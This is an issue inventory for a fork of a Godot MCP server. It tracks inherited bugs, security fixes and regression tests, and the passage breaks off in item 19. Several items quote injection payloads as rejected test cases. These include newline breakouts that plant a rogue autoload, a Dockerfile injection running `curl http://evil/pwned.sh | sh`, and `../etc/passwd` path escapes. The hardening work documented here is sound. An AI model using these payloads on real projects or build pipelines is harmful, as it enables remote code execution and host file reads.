# Cross-fork issue inventory

Status date: 2026-07-19

This inventory is the local source of truth for the takeover of `Defkil/godot-mcp`.
It covers all 70 issues inventoried across both predecessor repositories (9 immediate-upstream and 61 original-source issues), including closed reports whose fixes may not be ancestors of this fork. An upstream issue being closed is not accepted as proof by itself: inherited fixes receive regression coverage here. The corresponding audit also reviewed 69 pull requests (11 immediate-upstream and 58 original-source). No issue state in a public repository is changed by this work.

Repositories:

- Current fork: <https://github.com/Defkil/godot-mcp>
- Immediate upstream: <https://github.com/tugcantopaloglu/godot-mcp>
- Original source: <https://github.com/Coding-Solo/godot-mcp>

Disposition values:

- `verified`: present and covered by a meaningful local check
- `partial`: some requested behavior exists, but the failure mode is not closed
- `open`: implementation or regression coverage is still required
- `delivery`: release/documentation/packaging work rather than a runtime defect
- `out-of-core`: useful adjacent product, but not part of this server package

## Immediate-upstream regression set

All seven issues were closed upstream. They remain in the takeover gate until the
inherited behavior is verified against fixtures and a real Godot project.

| Issue | Upstream state | Local disposition | Required evidence |
|---|---:|---|---|
| [tugcantopaloglu#8](https://github.com/tugcantopaloglu/godot-mcp/issues/8) Resource properties silently fail in `modify_scene_node` | closed | partial | `godot_operations.gd` records typed `_postcondition_errors` for unresolvable `res://` resources and rejected `target.set()` calls, and the runner now emits a typed `status: error` envelope that the focused `src/tools/scene/modify-scene-node.ts` module surfaces as a `SceneOperationPostconditionError` (covered by `tests/scene-tools.test.ts` with stubbed and real MCP `tools/call` wiring). A wire-level modify→read round-trip contract test (`tests/scene-round-trip.test.ts`) proves that resource-valued properties (`res://...`) survive a `modify_scene_node` → `read_scene` cycle through the MCP `tools/call` boundary. The real-Godot `.tscn` round-trip fixture remains out of scope for this branch (no Godot binary in the takeover runner). |
| [tugcantopaloglu#9](https://github.com/tugcantopaloglu/godot-mcp/issues/9) unrestricted persistent autoload injection | closed | partial | Canonical path policy for every project/file tool plus byte-exact transactional cleanup. `handleManageAutoloads` now enforces a strict identifier gate (`/^[A-Za-z_][A-Za-z0-9_]*$/`) on the autoload `name` for both `add` and `remove`, and a `res://` + relative-member gate (rejecting bare paths, `..` segments, leading slashes, and backslash escapes) on the `path`. The remove regex is now anchored with the same identifier gate so a caller cannot smuggle `.*`/alternation wildcards and wipe every autoload. Wire-level regression coverage in `tests/manage-autoloads-injection.test.ts` (7 tests): newline-injection add rejected, non-`res://` path rejected, project-root escape (`res://../etc/passwd`) rejected, regex wildcard remove rejected, harmless add still works, targeted remove still works, and `list` still returns the parsed table without writing. The byte-exact transactional cleanup pattern that `bridge-installer.ts` already uses remains the canonical mechanism; the sibling `manage_autoloads` tool now satisfies the gate contract before any `writeFileSync`. |
| [tugcantopaloglu#11](https://github.com/tugcantopaloglu/godot-mcp/issues/11) tween vectors/colors crash the bridge | closed | partial | `mcp_interaction_server.gd` null-checks the returned `PropertyTweener` in `_cmd_tween_property` so a type mismatch no longer crashes/freezes the channel, and `_json_to_variant` accepts JSON-string-encoded `Vector2`/`Vector3`/`Color` payloads. Wire-level coverage in `tests/tween-vector-bridge.test.ts` asserts `BridgeClient` forwards `Vector2`, `Vector3` and `Color` `final_value` payloads byte-for-byte through NDJSON, that a tween-then-follow-up command on the same socket still resolves, and that the bridge survives an error envelope from a tween type mismatch. Real Godot regression against a live runtime remains the next-follow-up release gate. |
| [tugcantopaloglu#12](https://github.com/tugcantopaloglu/godot-mcp/issues/12) schemas advertise phantom commands/actions | closed | partial | A typed registry now derives schema and dispatch for migrated tools. Real MCP list coverage confirms 158 unique advertised names, and real MCP call coverage exercises migrated handlers, including a project-settings mutation with independent file read-back. The fifteen migrated tools are `modify_project_settings`, `list_project_files`, `launch_editor`, `read_scene`, `modify_scene_node`, `remove_scene_node`, `classdb_inspect`, `get_project_info`, `read_project_settings`, `read_file`, `write_file`, `delete_file`, `create_directory`, `list_projects`, and `rename_file`; each is registered in `toolRegistry` and removed from the legacy switch and flat-list block, leaving 143 legacy `case` statements in `src/server.ts` and 143 flat-list entries. Complete migration must remove the remaining legacy source-text switch assertions. |
| [tugcantopaloglu#13](https://github.com/tugcantopaloglu/godot-mcp/issues/13) success envelopes for no-op writes | closed | partial | `godot_operations.gd` records a typed `_postcondition_errors` entry for every silent `target.set()` rejection and every `remove_child` that did not actually detach the node; the runner emits a typed `status: error` envelope that the focused `src/tools/scene/{modify,remove}-scene-node.ts` modules propagate as a `SceneOperationPostconditionError`. A wire-level modify→read round-trip contract test (`tests/scene-round-trip.test.ts`) exercises the full `modify_scene_node` → `read_scene` cycle through the MCP `tools/call` boundary for numeric, boolean, and `res://` resource properties; the typed postcondition error envelope is asserted for the missing-resource path. Mutation plus independent read-back against a real Godot project remains the next-follow-up release gate. |
| [tugcantopaloglu#14](https://github.com/tugcantopaloglu/godot-mcp/issues/14) `game_wait` cannot wait for physics ticks | closed | partial | `mcp_interaction_server.gd::_cmd_wait` reads `params.frame_type` (default `"render"`) and routes physics into `await get_tree().physics_frame` and render into `await get_tree().process_frame`; the legacy `physics` boolean shortcut is preserved. Wire-level coverage in `tests/game-wait-frame-bridge.test.ts` proves the TypeScript `handleGameWait` transform maps the user-facing `frameType` (camelCase, enum `render`|`physics`) onto the GDScript-facing `frame_type` (snake_case) without losing the literal `"physics"` value, that `BridgeClient.sendCommand` forwards the `wait` command byte-for-byte through NDJSON with both `frames` (default `1`) and `frame_type` (default `"render"`) resolved, that the bridge socket survives a wait-then-follow-up flow (`get_performance`) on the same connection, that a wait error envelope from the bridge still permits a follow-up command, and that the GDScript source still contains both `physics_frame` and `process_frame` branches plus the literal ternary `"frame_type": "physics" if use_physics else "render"`. Real Godot regression against a live runtime remains the next-follow-up release gate. |
| [tugcantopaloglu#16](https://github.com/tugcantopaloglu/godot-mcp/issues/16) bridge script copied over user-managed setup | closed | partial | Preserve pre-existing script/autoload byte-for-byte and remove only files created by the server |

## Original-source active issues and inherited critical fixes

The original repository had 61 issues in the verified historical inventory, including 23 open reports. Several closed fixes were implemented after the histories diverged and therefore still require explicit adoption here.

| Issue | Local disposition | Takeover decision |
|---|---|---|
| [Coding-Solo#95](https://github.com/Coding-Solo/godot-mcp/issues/95) arbitrary GDScript instantiation through node class parameters | partial | Two-layer fix adopted from PR #99: TypeScript accepts identifiers only and GDScript loads custom classes only from the global class registry. Unit/handler regressions pass; real Godot fixture remains required. |
| [Coding-Solo#120](https://github.com/Coding-Solo/godot-mcp/issues/120) list project files | verified | `list_project_files` now uses a behavior-tested deterministic scanner with extension filtering, project-relative paths, hidden-tree exclusion, traversal/output bounds and canonical request-boundary path enforcement. |
| [Coding-Solo#118](https://github.com/Coding-Solo/godot-mcp/issues/118) vulnerable axios/MCP SDK | verified | Current lockfile reports `npm audit` zero; keep Dependabot and scheduled audit gates. |
| [Coding-Solo#114](https://github.com/Coding-Solo/godot-mcp/issues/114) attach C# script | open | `handleAttachScript` now enforces the script-kind / project-kind gate (rejects `scriptPath` ending in anything other than `.gd` or `.cs` with a typed diagnostic; rejects `.cs` against non-.NET projects with the same `create_csharp_script` message). The `attach_script` GDScript op still blindly `load()`s the script, but the typed MCP error envelope short-circuits before any headless I/O. Real-Godot verification of the matching `attach_script` round-trip in a .NET project remains the next-follow-up release gate. Wire-level coverage in `tests/attach-script-dotnet-gate.test.ts` exercises the gate through the real MCP `tools/call` boundary with a stubbed `executeOperation` and proves both branches (reject `.cs` on plain, accept `.cs` on .NET, accept `.gd`, reject unknown extension). |
| [Coding-Solo#111](https://github.com/Coding-Solo/godot-mcp/issues/111) Godot 4.7 support | partial | Wargrid already runs on Godot 4.7; add 4.4–4.7 compatibility fixtures and CI matrix documentation. |
| [Coding-Solo#106](https://github.com/Coding-Solo/godot-mcp/issues/106) return launch errors to the agent | verified | `launch_editor` is now migrated to the tool registry (`src/tools/editor/launch-editor.ts`) and observes startup through `BoundedLineBuffer` + `observeStartup`. It returns a typed `LaunchError` (with retained stderr diagnostics and a never-optimistic success envelope) for early exit, parse/load errors, project-missing and path-policy denials. `run_project` continues to use the same primitives. Real Godot launch regression against the wired `BridgeClient` (`#84` follow-up) remains. |
| [Coding-Solo#103](https://github.com/Coding-Solo/godot-mcp/issues/103) document texture import prerequisite | partial | `src/godot/asset-import-state.ts` adds a pure `detectAssetImportState` helper that resolves the asset through the OS-native `node:path` resolver (and the server's canonical `PathPolicy`), classifies the result against an allowlist of import-eligible extensions (`.png`, `.jpg`, `.jpeg`, `.webp`, `.svg`, `.ktx2`, `.tga`, `.bmp`, `.exr`, `.hdr`, `.gif`, `.aseprite`, `.ase`, `.glb`, `.gltf`, `.blend`, `.fbx`, `.obj`, `.wav`, `.ogg`, `.mp3`), and reports whether the matching `.import` sidecar is present. `.pck` packs and `.json` data files are correctly treated as non-import assets because Godot loads them directly without generated sidecars. The helper returns a typed `AssetImportProbe` with `state: 'imported' \\| 'missing-sidecar' \\| 'not-an-asset' \\| 'missing-source'` and a human-readable diagnostic that names the exact project-root path plus the Godot CLI command needed to import the sidecar (`godot --headless --path <project> --editor --quit --import`). `handleLoadSprite`, `handleCreateResource`, and the `load` action of `handleManageResource` each run the probe BEFORE `executeOperation` is reached, surface the diagnostic as a typed `isError: true` envelope, and preserve the existing happy paths for non-import-eligible extensions (`.gd`, `.cs`, `.tscn`, `.uid`, hand-authored `.tres`, `.json`, `.pck`). Wire-level coverage in `tests/asset-import-prerequisite.test.ts` (16 tests): 6 pure-helper branches, two non-import file regressions, the standalone remediation string, and three live MCP `tools/call` paths through the real `GodotServer` + `PathPolicy` + `CapabilityPolicy` + stubbed `executeOperation`. Real Godot end-to-end verification of the import prerequisite remains the next-follow-up release gate. |
| [Coding-Solo#102](https://github.com/Coding-Solo/godot-mcp/issues/102) malformed UID resave root and false success | partial | The operation now passes `res://` and requires a typed Godot-side result summary; a real Godot fixture regression remains. |
| [Coding-Solo#98](https://github.com/Coding-Solo/godot-mcp/issues/98) ClassDB access | verified | `classdb_inspect` is a bounded read-only tool registered with capability `inspect`. It resolves the project through `PathPolicy.assertProject`, validates `className` against a strict identifier regex (`^[A-Za-z_][A-Za-z0-9_]*$` — no path, no `.gd` extension), forwards one headless `classdb_inspect` operation to `godot_operations.gd`, and surfaces typed `status: error` postcondition failures as a structured MCP error envelope. The Godot operation walks the parent chain (bounded at 16) and reports methods/properties/signals/enums/constants for the target class. Schema-parity and capability-gate tests prove it is advertised exactly once and dispatched through the registry. 10 unit/wire-level tests in `tests/classdb-inspect.test.ts`. |
| [Coding-Solo#97](https://github.com/Coding-Solo/godot-mcp/issues/97) policy enforcement | partial | Closed-list capability profiles (`inspect-only`, `safe-mutations`, `runtime-control`, `legacy-full`, `unsafe-full`) gate every `CallToolRequest` through a typed `CapabilityPolicy` + `CapabilityDeniedError`. `legacy-full` is the default so existing Wargrid/Heimdash clients keep working without a config change; arbitrary-GDScript tools (`game_eval`, `game_call_method`, `attach_script`, `create_script`, `create_csharp_script`, `manage_ci_pipeline`, `manage_docker_export`, `validate_scripts`, ...) are blocked under every other profile. Outbound transport tools (`game_http_request`, `game_websocket`, `game_multiplayer`, `game_rpc`) are classified `network` so `runtime-control` denies them at the gate instead of silently egressing under the `runtime` capability. Wire-level tests in `tests/capability-gate.test.ts` cover the legacy-case path, the registry-dispatch path, `unsafe-full` opt-in, the network reclassification, and `legacy-full` admission. A bounded `RequestLimiter` (`src/security/request-limiter.ts`) now also enforces three independent gates at the same boundary before the capability check: per-request byte-size (`GODOT_MCP_MAX_REQUEST_BYTES`, default 1 MiB), global concurrency (`GODOT_MCP_MAX_CONCURRENT_REQUESTS`, default 8), and a per-tool token-bucket rate limit (`GODOT_MCP_RATE_PER_MINUTE`, default 120/min). Both limiters trip before any handler runs, surface typed `RequestTooLargeError` / `RateLimitExceededError` as `isError: true` envelopes, and release the concurrency slot in a single wrapping `finally`. 15 unit/wire-level tests in `tests/request-limiter.test.ts` cover size admission/denial, concurrency acquire/release, per-tool rate overflow, refill after the 60s window, bucket separation, env parsing (defaults, overrides, malformed), and the wire-level gate at `tools/call`. |
| [Coding-Solo#88](https://github.com/Coding-Solo/godot-mcp/issues/88) visual debugging/playtest capture | partial | Screenshot exists; add deterministic capture readiness and optional bounded frame sequence, not unrestricted recording. |
|| [Coding-Solo#84](https://github.com/Coding-Solo/godot-mcp/issues/84) bridge stuck connecting | partial | Fixed-port/fire-and-forget startup is replaced by an ephemeral authenticated readiness handshake with actionable failure; the transport layer was extracted into `src/godot/bridge/client.ts` (`BridgeClient`) with focused contract tests covering handshake success, token refusal, version mismatch, oversized NDJSON frames, fragmented chunks, request timeouts, socket close, idempotent destroy, and retry exhaustion. The wired `BridgeClient` is now the authoritative transport for `GodotServer.connectToGame` / `sendGameCommand` / `disconnectFromGame` with typed `BridgeAuthenticationError` / `BridgeConnectionError` / `BridgeFrameError` envelopes and an opt-out from the connection retry loop on authentication failure; real Godot reconnect verification remains. |
| [Coding-Solo#70](https://github.com/Coding-Solo/godot-mcp/issues/70) `run_project` restart race | partial | Process-tree termination is awaited and session-bound cleanup is idempotent; real restart/port-release verification remains. |
| [Coding-Solo#68](https://github.com/Coding-Solo/godot-mcp/issues/68) keyboard/mouse input | partial | Input tools exist; verify sandboxed delivery and held-input cleanup on stop/disconnect. |
| [Coding-Solo#61](https://github.com/Coding-Solo/godot-mcp/issues/61) publish npm package | delivery | Prepare provenance-backed npm/GitHub release workflows; publication remains blocked on Oliver's approval. |
| [Coding-Solo#57](https://github.com/Coding-Solo/godot-mcp/issues/57) attach scripts/runtime tree/main scene | partial | Existing tools cover these operations; add typed round-trip and runtime tests. |
| [Coding-Solo#49](https://github.com/Coding-Solo/godot-mcp/issues/49) Windows JSON quoting | partial | `execFile` argument passing exists; add native Windows regression with spaces and Unicode paths. |
| [Coding-Solo#39](https://github.com/Coding-Solo/godot-mcp/issues/39) connect exported nodes | partial | Scene signals are supported; document and test exported-resource/node assignment workflows. |
| [Coding-Solo#37](https://github.com/Coding-Solo/godot-mcp/issues/37) false `No active Godot process` | partial | Explicit runtime states and retained post-exit diagnostics are implemented; real process-exit regression remains. |
| [Coding-Solo#30](https://github.com/Coding-Solo/godot-mcp/issues/30) old MCP SDK/dependencies | verified | MCP SDK and dependencies are current enough for audit zero; compatibility smoke remains a release gate. |
| [Coding-Solo#29](https://github.com/Coding-Solo/godot-mcp/issues/29) GUT integration | open | Add a generic headless Godot test runner with a GUT adapter and structured results. |
| [Coding-Solo#23](https://github.com/Coding-Solo/godot-mcp/issues/23) editor launch reports false success | verified | `launch_editor` migrated to the tool registry (`src/tools/editor/launch-editor.ts`); it resolves the project through `PathPolicy.assertProject`, asserts a `project.godot` exists, spawns with `-e --path`, observes startup through `BoundedLineBuffer` + `observeStartup`, and never returns an optimistic success envelope — early exit, parse/load errors, missing project, or path-policy denial all flow back as a typed `LaunchError` (with retained stderr) wrapped in an MCP `isError: true` response. |
| [Coding-Solo#22](https://github.com/Coding-Solo/godot-mcp/issues/22) Dockerfile/Glama listing | delivery | Do not claim an inherited listing. Evaluate a documented container image only for headless operations; GUI/runtime control remains local. |
| [Coding-Solo#20](https://github.com/Coding-Solo/godot-mcp/issues/20) scene creation JSON parsing | partial | Structured argv avoids shell quoting; verify Windows path/JSON fixtures and real scene creation. |

## Historical original-source dispositions

The following closed original-source reports complete the 61-issue inventory without pretending that tracker closure alone is proof:

- `partial` or covered by an active row above: [#112](https://github.com/Coding-Solo/godot-mcp/issues/112), [#101](https://github.com/Coding-Solo/godot-mcp/issues/101), [#54](https://github.com/Coding-Solo/godot-mcp/issues/54), [#31](https://github.com/Coding-Solo/godot-mcp/issues/31). These map respectively to policy/injection, C# attachment, real-version E2E coverage and runtime/scene inspection work.
- `verified in source; retain regression gates`: [#120](https://github.com/Coding-Solo/godot-mcp/issues/120), [#118](https://github.com/Coding-Solo/godot-mcp/issues/118), [#81](https://github.com/Coding-Solo/godot-mcp/issues/81), [#68](https://github.com/Coding-Solo/godot-mcp/issues/68), [#64](https://github.com/Coding-Solo/godot-mcp/issues/64), [#57](https://github.com/Coding-Solo/godot-mcp/issues/57), [#55](https://github.com/Coding-Solo/godot-mcp/issues/55), [#49](https://github.com/Coding-Solo/godot-mcp/issues/49), [#46](https://github.com/Coding-Solo/godot-mcp/issues/46), [#44](https://github.com/Coding-Solo/godot-mcp/issues/44), [#40](https://github.com/Coding-Solo/godot-mcp/issues/40), [#33](https://github.com/Coding-Solo/godot-mcp/issues/33), [#24](https://github.com/Coding-Solo/godot-mcp/issues/24), [#15](https://github.com/Coding-Solo/godot-mcp/issues/15), [#14](https://github.com/Coding-Solo/godot-mcp/issues/14), [#13](https://github.com/Coding-Solo/godot-mcp/issues/13), [#9](https://github.com/Coding-Solo/godot-mcp/issues/9), [#8](https://github.com/Coding-Solo/godot-mcp/issues/8), [#5](https://github.com/Coding-Solo/godot-mcp/issues/5), [#3](https://github.com/Coding-Solo/godot-mcp/issues/3), [#1](https://github.com/Coding-Solo/godot-mcp/issues/1).
- `feature/delivery`: [#77](https://github.com/Coding-Solo/godot-mcp/issues/77), [#76](https://github.com/Coding-Solo/godot-mcp/issues/76), [#73](https://github.com/Coding-Solo/godot-mcp/issues/73), [#71](https://github.com/Coding-Solo/godot-mcp/issues/71). These remain candidates for bounded instructions, tooling and documentation rather than release-blocking inherited defects.
- `out-of-core, external or obsolete`: [#119](https://github.com/Coding-Solo/godot-mcp/issues/119), [#117](https://github.com/Coding-Solo/godot-mcp/issues/117), [#116](https://github.com/Coding-Solo/godot-mcp/issues/116), [#90](https://github.com/Coding-Solo/godot-mcp/issues/90), [#86](https://github.com/Coding-Solo/godot-mcp/issues/86), [#85](https://github.com/Coding-Solo/godot-mcp/issues/85), [#43](https://github.com/Coding-Solo/godot-mcp/issues/43), [#36](https://github.com/Coding-Solo/godot-mcp/issues/36), [#28](https://github.com/Coding-Solo/godot-mcp/issues/28), [#21](https://github.com/Coding-Solo/godot-mcp/issues/21), [#17](https://github.com/Coding-Solo/godot-mcp/issues/17), [#16](https://github.com/Coding-Solo/godot-mcp/issues/16), [#7](https://github.com/Coding-Solo/godot-mcp/issues/7).

The two immediate-upstream issues omitted from the focused regression table are [#1](https://github.com/tugcantopaloglu/godot-mcp/issues/1) (test coverage, still partial until Godot E2E exists) and [#4](https://github.com/tugcantopaloglu/godot-mcp/issues/4) (strict-type warnings, implemented in the inherited source).

## Additional defects found during takeover

1. Agent-controlled `rootNodeType`/`nodeType` values could previously load arbitrary raw GDScript paths and execute `script.new()`; the takeover adopts the two-layer identifier/global-class-registry fix from original-source PR #99.
2. `src/index.ts` was a 7,115-line executable monolith and could not be imported as a library without starting the server.
3. `mcp_interaction_server.gd` was a single-client server on fixed port `9090` with no authentication token; the takeover now uses an ephemeral loopback port, a per-session token, a versioned handshake, connection ownership and frame bounds.
4. `godot_operations.gd` is a 1,887-line dispatcher. The shared headless-operation path now uses the bounded streaming TypeScript operation runner for every operation: process success, startup observation, bounded output/arguments, timeout cleanup and typed result markers are enforced centrally. Operation-specific postcondition checks and further handler decomposition remain open.
5. Most handler tests inspect source strings and regular expressions; they do not execute handlers or Godot. The registry migration now executes `modify_project_settings` and `list_project_files` through the real MCP list/call boundary, with independent mutation read-back for project settings, but the remaining legacy tools still require behavioral parity coverage.
6. Many filesystem handlers used lexical `validatePath` plus `join`; a centralized request-boundary guard now applies canonical project roots and member resolution to every project-bearing tool. The project file scanner additionally rejects standalone subdirectory escapes and bounds traversal, entry count and encoded output while handler-by-handler cleanup remains ongoing.
7. Runtime output arrays were unbounded and exit cleared diagnostics; takeover lifecycle tests now cover bounded buffers and retained terminal state.
8. Process termination was not awaited; the takeover now waits for graceful termination and escalates to process-tree termination with platform-specific tests.
9. Bridge installation heuristically rewrote `project.godot`; the takeover now restores byte-exact snapshots and preserves colliding/user-managed files.
10. `update_project_uids` passed a host path as a resource root; the takeover now passes `res://` and requires a typed result marker, pending real-Godot verification.
11. The package had one executable/library entrypoint; the takeover branch now separates them while preserving legacy `build/index.js` execution.
12. The MCP initialization metadata advertised stale version `0.1.0` independently of the package manifest; the server now sources its advertised version from the installed `package.json`, with a behavioral regression test. Runtime launch responses also keep both per-session port and token confined to the child environment, matching the documented transport boundary.
13. `launch_editor` returned an optimistic success envelope immediately after `spawn()` without observing startup, capturing stderr, or distinguishing parse/load errors from a healthy launch; the takeover migrates it to the tool registry (`src/tools/editor/launch-editor.ts`) and reuses the same `BoundedLineBuffer` + `observeStartup` + `terminateProcessTree` primitives already exercised by `run_project`, with regression tests covering a healthy grace window, an early exit, a parse/load error pattern, a missing `project.godot`, and a path-policy denial.
14. The release manifests (`package.json`, `package-lock.json`, `server.json`) still advertised the immediate upstream identity (`@tugcantopaloglu/godot-mcp@3.1.0`, `io.github.tugcantopaloglu/godot-mcp`, repository pointing at `github.com/tugcantopaloglu/godot-mcp`); a Defkil-published artifact would have shipped under the wrong owner/namespace. The takeover rebases the manifests on `@defkil/godot-mcp@4.0.0` / `io.github.Defkil/godot-mcp` / `github.com/Defkil/godot-mcp`, extends `scripts/sync-version.js` so `npm version` now propagates both name and version into the lockfile and the MCP Registry npm entry, and locks the contract with `tests/package-identity.test.ts` (7 tests: scope, repository URLs, MCP Registry name, npm-identifier alignment, lockfile alignment, MIT attribution, and bug-tracker URL). Both predecessor MIT copyright lines (`Tugcan Topaloglu` 2025; `Solomon Elias` 2025) stay in `LICENSE` and `README.md` credits; only the npm/registry-facing identity and the Defkil-owned bug tracker change. `git diff --check`, `npm run build`, `npm test` (702/702), and `npm audit --audit-level=high` (0) are green; `npm pack --dry-run` reports `defkil-godot-mcp-4.0.0.tgz` with the new identity.
15. The autoload-injection gate (#9) was a one-off fix; the same class of bug persisted in the sibling `handleManageLayers` and `handleManagePlugins` handlers, which constructed the layer/plugin setting line as a raw string interpolation into `project.godot` and used lexical `validatePath` instead of the request-boundary `PathPolicy.assertProject`. A caller could inject a newline + section header into `name` (for layers) or `pluginName` (for plugins) and silently corrupt unrelated tables on disk. The takeover now applies the same identifier / value gate: `manage_layers` `set` requires `layerType` to be one of the documented enum values, `layer` to be an integer in `[1, 32]`, and `name` to match `/^[A-Za-z_][A-Za-z0-9_]*$/`; `manage_plugins` `enable`/`disable` requires `pluginName` to match the same strict identifier regex. Both handlers now resolve the project through `this.pathPolicy.assertProject` and write the canonical root path back. Wire-level coverage in `tests/manage-layers-plugins-injection.test.ts` (11 tests): section-breaking newline in layer name rejected, equals-sign in layer name rejected, undocumented `layerType` rejected, layer out of range rejected, benign layer set still works, layer `list` reports the parsed table without writing, section-breaking newline in plugin name rejected, forward-slash in plugin name rejected, benign plugin enable still works, benign plugin disable still works, plugin `list` reports enabled/available without writing.
16. The same injection class persisted in `handleSetMainScene` and `handleManageTranslations`: `set_main_scene` concatenated `run/main_scene="<scenePath>"` directly into `project.godot` via `content.replace('[application]', ...)` and `manage_translations` `add` built `translations=PackedStringArray(..., "<resPath>")`, while `manage_translations` `remove` used a `RegExp` whose pattern was built from a user-controlled `translationPath` (regex metas escaped but no canonical `res://` enforcement). A caller could pass `scenePath = "evil.tscn\n[autoload]\nMcpInteractionServer=\"*res://evil.gd\""` (or the equivalent `translationPath`) and silently corrupt unrelated sections or wipe sibling translations. The takeover now applies the same project-path gate as items 14-15 (`this.pathPolicy.assertProject(args.projectPath)` replaces lexical `validatePath`) and a strict `res://` + canonical-project-member gate on `scenePath` / `translationPath` that rejects newlines, double quotes, opening/closing brackets, equals signs, `..` segments, and missing extensions BEFORE any file is touched. The legacy auto-prepend shortcut (`args.scenePath.startsWith('res://') ? args.scenePath : 'res://' + args.scenePath`) is intentionally dropped in favor of strict canonical input; the contract change matches the sibling `manage_autoloads` / `manage_layers` / `manage_plugins` gates. Wire-level coverage in `tests/set-main-scene-translations-injection.test.ts` (14 tests): section-breaking newline in `scenePath` rejected, double-quote break-out rejected, scenePath lacking `res://` rejected, `..` escape rejected, opening-bracket section break rejected, benign `scenePath` writes a single well-shaped `run/main_scene=...` line under `[application]`, replacement of an existing `run/main_scene` line preserves sibling `[autoload]` entries; section-breaking newline in `translationPath` (`add`) rejected, `translationPath` lacking `res://` rejected for both `add` and `remove`, `..` escape rejected for `add`, benign `add` writes a canonical line under a new `[internationalization]` section, benign `remove` strips one matching line and leaves sibling translations, `list` reports the parsed table without writing.
17. The same injection class persisted in `handleManageShader`: the handler historically `join(args.projectPath, args.shaderPath)`-ed a user-supplied `shaderPath`, gated only by the lexical `validatePath` boundary on both `projectPath` and `shaderPath`, and `mkdirSync(dirname(fullPath), { recursive: true })` any user-named parent directory before writing the shader source. A caller could pass `shaderPath = 'evil.gdshader\n[autoload]\nMcpInteractionServer="*res://evil.gd"'` (and a benign `read` would echo that payload as the error message, leaking the injected section header to the client), `shaderPath = 'shaders/spatial.gdshader'` to write/read arbitrary relative project members without the canonical `res://` prefix, `shaderPath = 'sub/../etc/passwd'` to read arbitrary host files through the joined path (the regex rejected it via the sibling fallback but only because `validatePath` checks the `..` prefix — not the inside-segment `..`), and any unknown `action` (e.g. `delete`) reached the `mkdirSync` line before the `Unknown action` error fired. The takeover now applies the same canonical `res://` + canonical-project-member regex + `PathPolicy.assertProject` + `PathPolicy.resolveProjectMember` gate as items 14-16, plus an explicit action allowlist (`read` | `create`) BEFORE any filesystem call. The legacy auto-prepend shortcut is intentionally dropped (callers MUST supply `res://shaders/foo.gdshader`); the contract change matches the sibling gates. Wire-level coverage in `tests/manage-shader-injection.test.ts` (8 tests): section-breaking newline in `shaderPath` rejected, double-quote break-out rejected, `shaderPath` lacking `res://` rejected, `..` escape rejected (via path policy, not just regex), unknown `action` rejected without touching the filesystem, benign `read` of an existing `res://` shader returns the source, benign `create` writes a single `.gdshader` file under the named directory and does not touch `project.godot`, benign `read` of a missing `res://` shader returns the not-found envelope.

18. The same template-injection class persisted in `handleManageCiPipeline` and `handleManageDockerExport`: both handlers wrote the generated file (`.github/workflows/godot-export.yml` / `Dockerfile`) directly from a template literal that interpolated caller-supplied `godotVersion` / `platforms` / `baseImage` / `exportPreset` strings into shell commands that execute on every CI build and at every container runtime. `godotVersion` flows into `mkdir -p ... /godot/export_templates/${godotVersion}` and `mv ... /godot/export_templates/${godotVersion}/*` (CI), and into `wget ... /releases/download/${GODOT_VERSION}/...` + `mv templates/* /root/.local/share/godot/export_templates/${GODOT_VERSION}/` (Docker). `platforms` flows into `godot --export-release "${p}"` shell steps (CI). `baseImage` flows into the `FROM ${baseImage}` Dockerfile directive. `exportPreset` flows into the runtime `CMD ["godot", ..., "${exportPreset}", ...]` shell command. A caller could pass `godotVersion = '4.3-stable\nrun: |\n  echo PWNED > /tmp/pwned\n'` to break out of the YAML and inject arbitrary GitHub Actions steps, `baseImage = 'ubuntu:22.04\nRUN curl http://evil/pwned.sh | sh\n'` to inject arbitrary Dockerfile instructions, `platforms = ['linux"\n  - run: echo PWNED']` to break out of the YAML and inject arbitrary shell, or `exportPreset = 'Linux/X11"\nRUN curl http://evil/pwned.sh | sh\n'` to inject arbitrary Dockerfile content, and the lexical `validatePath` boundary on `projectPath` only rejects empty / `..`-bearing strings (letting newlines / quotes / brackets through). The takeover now applies the same canonical-root enforcement (`this.pathPolicy.assertProject(args.projectPath)` replaces lexical `validatePath`) plus an explicit action allowlist (`read` | `create`) BEFORE any filesystem call, a strict Godot release-tag allowlist (`^[0-9]+\.[0-9]+(\.[0-9]+)?(-[a-z0-9]+)?$`) on `godotVersion`, a closed-list platforms allowlist (`linux` | `windows` | `macos` | `web` | `android` | `ios`) on each `platforms[]` entry, a Docker image-reference allowlist (`^[a-z0-9]+([._-][a-z0-9]+)*(:[a-z0-9._-]+)?$`) on `baseImage`, and a Godot export-preset name allowlist (`^[A-Za-z0-9 _.\-/]+$`) on `exportPreset`. The contract changes match the sibling gates in items 14-17 (same canonical-root enforcement, same explicit action allowlist, same strict value gates). Wire-level coverage in `tests/manage-ci-pipeline-injection.test.ts` (8 tests) and `tests/manage-docker-export-injection.test.ts` (9 tests): section-breaking newline in `godotVersion` rejected (CI), shell backtick in `godotVersion` rejected (CI), double-quote break-out in `godotVersion` rejected (CI), shell break-out in `platforms[]` rejected (CI), unknown `action` rejected without touching the filesystem (CI), benign `create` writes a single well-shaped workflow file and does not touch `project.godot` (CI), benign `read` of an existing workflow returns the source (CI), benign `read` of a missing workflow returns the not-found envelope (CI); section-breaking newline in `godotVersion` rejected (Docker), shell backtick in `godotVersion` rejected (Docker), Dockerfile-directive break-out in `baseImage` rejected (Docker), shell break-out in `exportPreset` rejected (Docker), unknown `action` rejected without touching the filesystem (Docker), benign `create` with default values writes a single well-shaped Dockerfile and does not touch `project.godot` (Docker), benign `create` with custom valid version and base image writes the documented file (Docker), benign `read` of an existing Dockerfile returns the source (Docker), benign `read` of a missing Dockerfile returns the not-found envelope (Docker).

## Publication boundary

Everything in this inventory is local preparation. No branch, commit, package,
container, release, issue comment, issue closure or pull request is published until
Oliver explicitly approves the exact reviewed candidate.

19. The five lowest-level file-I/O handlers (`handleReadFile`, `handleWriteFile`,
    `handleDeleteFile`, `handleCreateDirectory`, `handleRenameFile`) historically
    used only the lexical `validatePath` boundary on both `projectPath` and the
    member path (`filePath`, `newPath`, `directoryPath`), then `join(args.projectPath,
    args.<member>)`-ed the user-supplied values into `readFileSync` / `writeFileSync`
    / `unlinkSync` / `mkdirSync` / `renameSync`. While the request-boundary
    `assertSafeToolPaths` already rejects every canonical member path that would
    escape the configured `PathPolicy` roots BEFORE the handler is called, the
    handler bodies themselves did not formally adopt the canonical-root contract.
    If a future refactor bypassed the boundary guard (e.g., by invoking a handler
    outside the standard `CallToolRequest` path, or by a future internal admin
    tool that routed directly to the handler), the lexical `validatePath` was
    too weak to enforce the configured allowed-roots list. The takeover now
    replaces the lexical `validatePath` boundary on all five handlers with the
